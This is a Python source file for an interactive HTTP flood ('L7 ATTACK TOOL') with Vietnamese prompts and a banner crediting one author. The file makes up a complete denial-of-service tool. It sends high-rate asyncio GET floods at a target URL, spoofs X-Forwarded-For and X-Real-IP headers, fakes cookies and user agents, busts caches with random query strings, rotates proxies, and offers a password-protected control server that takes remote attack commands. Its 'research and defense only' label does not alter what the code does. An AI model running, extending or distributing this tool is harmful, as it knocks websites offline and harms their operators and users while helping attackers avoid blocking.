import os
import asyncio
import aiohttp
import socket
import random
import string
import time
import json
import functools
import ssl
from aiohttp import ClientSession, TCPConnector
from aiohttp.client_exceptions import ClientError, ClientConnectionError, ClientResponseError, ServerTimeoutError

from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
import urllib3

# --- SECURITY SETTINGS ---
CONTROL_SERVER_BIND_ADDR = "127.0.0.1"  # Do not use '0.0.0.0'!
CONTROL_SERVER_PORT = 65099             # Non-trivial port
CONTROL_SERVER_PASSWORD = os.environ.get("DDOS_CTRL_PASS", "changeme") # for PoC, set via env or config
CONTROL_SERVER_USE_TLS = True

SSL_CONTEXT = None
if CONTROL_SERVER_USE_TLS:
    SSL_CONTEXT = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    # Generate or provide cert/key in production!
    # For demo, allow without cert (insecure, but less error for PoC).
    SSL_CONTEXT.check_hostname = False
    SSL_CONTEXT.verify_mode = ssl.CERT_NONE

LOOP = asyncio.get_event_loop()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def fancy_banner():
    banner = r"""
\033[1;35m
   ██████╗ ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     
  ██╔════╝ ██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  ██║  ███╗██████╔╝██║   ██║█████╗         ██║   ██║   ██║██║   ██║██║     
  ██║   ██║██╔═══╝ ██║   ██║██╔══╝         ██║   ██║   ██║██║   ██║██║     
  ╚██████╔╝██║     ╚██████╔╝███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

─────────────────────────────────────────────────────────────────────────────
               \033[1;33mDDOS TOOL - by Trịnh Đức Đài (2024) \033[1;35m
     (Technical rewrite: Asyncio + Resource & Security fix)\033[1;35m
        ░▒▓█  Nhập IP hoặc tên miền để dễ sử dụng tool  █▓▒░
─────────────────────────────────────────────────────────────────────────────

        \033[1;36m____  ____   ___   ____    ____   ____   ____   __  
       |  _ \|  _ \ / _ \ / ___|  / ___| / ___| / ___| / /  
       | | | | | | | | | | |  _  | |     \___ \| |    / /   
       | |_| | |_| | |_| | |_| | | |___   ___) | |___/ /___ 
       |____/|____/ \___/ \____|  \____| |____/ \____|_____|\033[1;35m
                                                            
─────────────────────────────────────────────────────────────────────────────
          \033[1;31mL7 ATTACK TOOL - For research and defense only\033[1;35m
─────────────────────────────────────────────────────────────────────────────
\033[0m"""
    print(banner)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    # ... real UAs preferred ... (see original)
]

ENDPOINTS = [
    "/", "/login", "/api/data", "/register", "/products", "/search"
]

def random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def make_headers(custom_headers=None):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Cookie': f'sessionid={random_string(32)}; token={random_string(24)}',
        'X-Forwarded-For': '.'.join(str(random.randint(0,255)) for _ in range(4)),
        'X-Real-IP': '.'.join(str(random.randint(0,255)) for _ in range(4)),
        'Referer': 'https://google.com?q=' + random_string(8),
        'Connection': 'keep-alive',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Accept-Encoding': 'gzip, deflate, br',
        'Upgrade-Insecure-Requests': '1',
        'Accept': '*/*',
    }
    if custom_headers and isinstance(custom_headers, dict):
        headers.update(custom_headers)
    return headers

def get_exc_info(e):
    return f"{type(e).__name__}: {e}"

def backoff_delay(retry):
    """Exponential backoff with a small max cap."""
    return min(0.05 * (2 ** retry), 2.0)

async def async_flood_http(url, duration, rate, log=False, custom_headers=None, endpoints=None, timeout=5, proxy=None, max_conns=100):
    """
    Asyncio native HTTP(S) L7 flood with resource controls, backoff and session cleanup.
    proxy: string or list of proxy urls for rotation (no real stealth but better for rate).
    max_conns: Overall TCP connector pool size limit to avoid resource exhaustion.
    """
    connector = TCPConnector(limit=max_conns, ssl=False)
    async with ClientSession(connector=connector) as session:
        end = time.monotonic() + duration
        req_ok = 0
        req_fail = 0
        tasks = []
        target_endpoints = endpoints if endpoints is not None else ENDPOINTS

        sem = asyncio.Semaphore(rate)
        async def single_shot():
            nonlocal req_ok, req_fail
            ep = random.choice(target_endpoints)
            full_url = url + ep + f"?r={random_string(8)}"
            headers = make_headers(custom_headers)
            retry = 0
            while True:
                try:
                    # Support optional random proxy rotation (very basic implementation)
                    proxy_url = None
                    if proxy:
                        if isinstance(proxy, list):
                            proxy_url = random.choice(proxy)
                        else:
                            proxy_url = proxy
                    async with sem:
                        async with session.get(full_url, headers=headers, proxy=proxy_url, timeout=timeout) as r:
                            _ = await r.read()
                            req_ok += 1
                            if log:
                                print(f"\033[1;32m[ASYNC-OK] {full_url} {r.status} (rate={rate})\033[0m")
                    break
                except (ClientError, ServerTimeoutError, asyncio.TimeoutError) as e:
                    req_fail += 1
                    delay = backoff_delay(retry)
                    if retry < 2:
                        if log:
                            print(f"\033[1;31m[ASYNC-RETRY-{retry}] {get_exc_info(e)} after {delay:.2f}s\033[0m")
                        await asyncio.sleep(delay)
                        retry += 1
                        continue
                    else:
                        if log:
                            print(f"\033[1;31m[FAIL] {get_exc_info(e)}\033[0m")
                        break

        batch = []
        while time.monotonic() < end:
            now = time.monotonic()
            for _ in range(rate):
                batch.append(asyncio.create_task(single_shot()))
            # Await the batch, then next tick
            await asyncio.gather(*batch)
            batch.clear()
            if now + 1 > end:
                break
            await asyncio.sleep(max(0.01, min(1.0, end - now)))
        # Session auto-closes on exit

async def worker(url, duration, rate, log=False, custom_headers=None, endpoints=None, timeout=5, proxy=None):
    await async_flood_http(url, duration, rate, log, custom_headers, endpoints, timeout, proxy=proxy)

# --- CONTROL SERVER WITH AUTH & ENCRYPTION ---
async def auth_check(reader, writer):
    # Simple password exchange over TLS or plaintext (upgrade in prod!)
    writer.write(b'PASS: ')
    await writer.drain()
    pw = (await reader.readline()).decode().strip()
    return pw == CONTROL_SERVER_PASSWORD

async def control_server(host=CONTROL_SERVER_BIND_ADDR, port=CONTROL_SERVER_PORT, log=False):
    banner = f"\033[1;36m[CTRL] Control server on {host}:{port} TLS={CONTROL_SERVER_USE_TLS} (auth required)\033[0m"
    print(banner)
    async def handle_client(reader, writer):
        addr = writer.get_extra_info('peername')
        try:
            if not await auth_check(reader, writer):
                writer.write(b'ERR: Unauthorized\n')
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                print(f"\033[1;31m[CTRL] Unauthorized access from {addr}\033[0m")
                return
            writer.write(b'OK: Authenticated\n')
            await writer.drain()
            # Command format: JSON single-line per request
            line = await reader.readline()
            args = json.loads(line.decode())
            url = args.get('url')
            threads = args.get('threads', 8)
            duration = args.get('duration', 10)
            rate = args.get('rate', 25)
            headers = args.get('headers')
            endpoints = args.get('endpoints')
            timeout = args.get('timeout', 5)
            proxy = args.get('proxy')
            print(f"\033[1;33m[CTRL] Attack: {url} threads={threads} duration={duration}s rate={rate}/s headers={headers} endpoints={endpoints} timeout={timeout} proxy={proxy}\033[0m")
            tasks = []
            for _ in range(threads):
                tasks.append(worker(url, duration, rate, log=log, custom_headers=headers, endpoints=endpoints, timeout=timeout, proxy=proxy))
            await asyncio.gather(*tasks)
            writer.write(b'OK: attack finished\n')
            await writer.drain()
        except Exception as e:
            writer.write(f'ERR {e}\n'.encode())
            await writer.drain()
        finally:
            writer.close()
            await writer.wait_closed()

    srv = await asyncio.start_server(
        handle_client, host, port, ssl=SSL_CONTEXT if CONTROL_SERVER_USE_TLS else None
    )
    async with srv:
        await srv.serve_forever()

def prompt_for_int(prompt_text, current_value):
    while True:
        try:
            value = input(f"{prompt_text} (Hiện tại: {current_value}): ")
            if value.strip() == "":
                return current_value
            value = int(value)
            if value > 0:
                return value
            print("Giá trị phải lớn hơn 0.")
        except Exception:
            print("Vui lòng nhập số nguyên hoặc để trống để giữ nguyên.")

def prompt_for_bool(prompt_text, current_value):
    while True:
        value = input(f"{prompt_text} (Hiện tại: {'BẬT' if current_value else 'TẮT'}, nhập y/n hoặc Enter để giữ nguyên): ")
        if value.strip() == "":
            return current_value
        if value.lower() in ['y', 'yes', 'bật', 'on','1']:
            return True
        if value.lower() in ['n', 'no', 'tắt', 'off','0']:
            return False
        print("Vui lòng nhập y (bật), n (tắt), hoặc Enter để giữ nguyên.")

def prompt_for_choice(prompt_text, choices, current_value):
    while True:
        print(f"{prompt_text} (Hiện tại: {current_value}, chọn: {', '.join(choices)})")
        inp = input("Chọn: ").strip().lower()
        if not inp:
            return current_value
        if inp in choices:
            return inp
        print("Chọn không hợp lệ.")

if __name__ == '__main__':
    clear_screen()
    fancy_banner()
    import argparse
    import sys
    parser = argparse.ArgumentParser(description="DDOS L7 Tool (for research only - asyncio+fixes)")
    parser.add_argument("--url", type=str, help="Target URL (e.g., https://target.com)")
    parser.add_argument("--threads", type=int, default=10, help="Số 'threads'/tasks (default: 10, async)")
    parser.add_argument("--duration", type=int, default=120, help="Thời gian tấn công (giây, mặc định 120)")
    parser.add_argument("--rate", type=int, default=100, help="Số request mỗi giây mỗi task (mặc định 100)")
    parser.add_argument("--endpoints", type=str, help="Comma-separated list of endpoints (e.g., /,/login,/api/data)")
    parser.add_argument("--headers", type=str, help="Custom headers as JSON string (e.g., '{\"Authorization\":\"Bearer xyz\"}')")
    parser.add_argument("--timeout", type=int, default=3, help="Timeout for each request (seconds)")
    parser.add_argument("--control", action="store_true", help="Run in control server mode (now requires TLS+auth)")
    parser.add_argument("--log", action="store_true", help="Show log for every request")
    parser.add_argument("--proxy", type=str, help="Proxy URL or comma-list for simple rotation")
    args = parser.parse_args()

    # Nếu không truyền --url thì sẽ hỏi nhập IP/tên miền
    url = args.url
    if not url and not args.control:
        print("\033[1;36m[?]\033[0m Vui lòng nhập IP hoặc tên miền target (ví dụ: 192.168.1.1 hoặc example.com): ", end="")
        user_input = input().strip()
        # Kiểm tra nếu có http thì dùng luôn, nếu không thì tự thêm http://
        if not user_input.startswith('http://') and not user_input.startswith('https://'):
            url = "http://" + user_input
        else:
            url = user_input
    else:
        url = args.url

    custom_endpoints = ENDPOINTS
    if args.endpoints:
        custom_endpoints = [e.strip() for e in args.endpoints.split(',') if e.strip()]
    custom_headers = None
    if args.headers:
        try:
            custom_headers = json.loads(args.headers)
        except Exception as e:
            print(f"\033[1;31m[ERROR]\033[0m Không parse được headers JSON: {e}")
            custom_headers = None

    # Proxy rotation
    proxy_set = None
    if args.proxy:
        proxies = [p.strip() for p in args.proxy.split(',') if p.strip()]
        if proxies:
            proxy_set = proxies if len(proxies) > 1 else proxies[0]

    # Interactive adjustment
    if not args.control:
        print("\n\033[1;34m---- Có thể điều chỉnh thông số trước khi bắt đầu ----\033[0m")
        args.threads = prompt_for_int("Số tasks song song", args.threads)
        args.duration = prompt_for_int("Thời gian tấn công (giây)", args.duration)
        args.rate = prompt_for_int("Số request/giây mỗi task", args.rate)
        args.timeout = prompt_for_int("Timeout request (giây)", args.timeout)
        args.log = prompt_for_bool("Bật log requests?", args.log)
        change_endpoints = input(f"Sửa endpoints (Hiện tại: {custom_endpoints}), nhập các endpoint cách nhau bởi dấu phẩy hoặc Enter để giữ nguyên: ")
        if change_endpoints.strip():
            custom_endpoints = [e.strip() for e in change_endpoints.split(',') if e.strip()]
        change_headers = input(f"Sửa custom headers (hiện tại: {custom_headers}), nhập JSON hoặc Enter để giữ nguyên: ")
        if change_headers.strip():
            try:
                custom_headers = json.loads(change_headers)
            except Exception as e:
                print(f"\033[1;31m[ERROR]\033[0m Không parse được headers JSON: {e}")
                custom_headers = None

    if args.control:
        if not CONTROL_SERVER_PASSWORD or CONTROL_SERVER_PASSWORD == "changeme":
            print("\033[1;31m[-] WARNING: CONTROL_SERVER_PASSWORD is default/empty, set DDOS_CTRL_PASS ENV!\033[0m")
        # Run async control server and keepalive
        if CONTROL_SERVER_USE_TLS:
            print("\033[1;36m[~] Control server uses TLS, clients must support it\033[0m")
        try:
            LOOP.run_until_complete(control_server(log=args.log))
        except KeyboardInterrupt:
            print("\n\033[1;31m[CTRL] Server stopped\033[0m")
    else:
        print(f"""\033[1;32m[MAIN]\033[0m
    Đang bắt đầu tấn công (ASYNC): \033[1;36m{url}\033[0m
    Sử dụng \033[1;33m{args.threads}\033[0m task(s) trong \033[1;33m{args.duration}s\033[0m, tốc độ \033[1;33m{args.rate}/s\033[0m, log=\033[1;33m{args.log}\033[0m
    Endpoints: \033[1;33m{custom_endpoints}\033[0m
    Headers: \033[1;33m{custom_headers}\033[0m
    Timeout: \033[1;33m{args.timeout}s\033[0m
    Proxy(s): \033[1;33m{proxy_set}\033[0m
─────────────────────────────────────────────────────────────────────────────
        """)
        tasks = []
        for i in range(args.threads):
            tasks.append(worker(url, args.duration, args.rate, args.log, custom_headers, custom_endpoints, args.timeout, proxy_set))
        try:
            LOOP.run_until_complete(asyncio.gather(*tasks))
        except KeyboardInterrupt:
            print("\n\033[1;31m[MAIN] Interrupted\033[0m")
